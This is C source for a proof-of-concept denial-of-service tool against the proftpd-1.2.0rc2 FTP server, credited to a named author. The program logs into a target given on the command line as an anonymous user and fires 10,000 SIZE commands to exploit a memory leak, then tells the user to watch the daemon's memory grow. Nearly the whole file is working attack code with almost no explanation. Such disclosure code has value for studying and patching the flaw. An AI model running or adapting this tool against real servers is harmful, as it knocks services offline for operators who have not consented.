/*
 | Proftpd DoS
 | by Piotr Zurawski (szur@ix.renet.pl)
 | This source is just an example of memory leakage in proftpd-1.2.0(rc2)
 | server discovered by Wojciech Purczynski.
 |
 */

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <time.h>
#include <string.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <arpa/nameser.h>
#include <netdb.h>

#define USERNAME "anonymous"
#define PASSWORD "dupa@dupa.pl"
#define HOWMANY 10000

void logintoftp();
void sendsizes();
int fd;
struct in_addr host;
unsigned short port = 21;
int tcp_connect(struct in_addr addr,unsigned short port);

int main(int argc, char **argv)
{
  if (!resolve(argv[1],&host))
  {
    fprintf(stderr,"Hostname lookup failure\n");
    exit(0);
  }

  fd=tcp_connect(host,port);
  logintoftp(fd);
  printf("Logged\n");
  sendsizes(fd);

  printf("Now check out memory usage of proftpd daemon");
  printf("Resident set size (RSS) and virtual memory size (VSIZE)");
  printf("fields in ps output");
}

void logintoftp()
{
  char snd[1024], rcv[1024];
  int n;

  printf("Logging " USERNAME  "/"  PASSWORD "\r\n");

  memset(snd, '\0', 1024);
  sprintf(snd, "USER %s\r\n", USERNAME);
  write(fd, snd, strlen(snd));

  while((n=read(fd, rcv, sizeof(rcv))) > 0)
  {
    rcv[n] = 0;
    if(strchr(rcv, '\n') != NULL)break;
  }

  memset(snd, '\0', 1024);
  sprintf(snd, "PASS %s\r\n", PASSWORD);
  write(fd, snd, strlen(snd));

  while((n=read(fd, rcv, sizeof(rcv))) > 0)
  {
    rcv[n] = 0;
    if(strchr(rcv, '\n') != NULL)
      break;
  }
  return;
}

void sendsizes()
{
  char snd[1024], rcv[1024];
  unsigned long loop;

  printf ("Sending %i size commands... \n", HOWMANY);

  for(loop=0;loop<HOWMANY;loop++)
  {
    sprintf(snd, "SIZE /dadasjasojdasj/adhjaodhahasohasaoihroaha\n");
    write(fd, snd, strlen(snd));
  }
  return;
}

int tcp_connect(struct in_addr addr,unsigned short port)
{
  int fd;

  struct sockaddr_in serv;
  bzero(&serv,sizeof(serv)); serv.sin_addr=addr;
  serv.sin_port=htons(port);
  serv.sin_family=AF_INET;

  if ((fd=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)) < 0)\
  {
    perror("socket");
    exit(0);
  }

  if (connect(fd,(struct sockaddr *)&serv,sizeof(serv)) < 0)
  {
    perror("connect");
    exit(0);
  }

  return(fd);
}

int resolve(char *hostname,struct in_addr *addr)
{
  struct hostent *res;
  res=gethostbyname(hostname);
  if (res==NULL)
    return(0);
  memcpy((char *)addr,res->h_addr,res->h_length);
  return(1);
}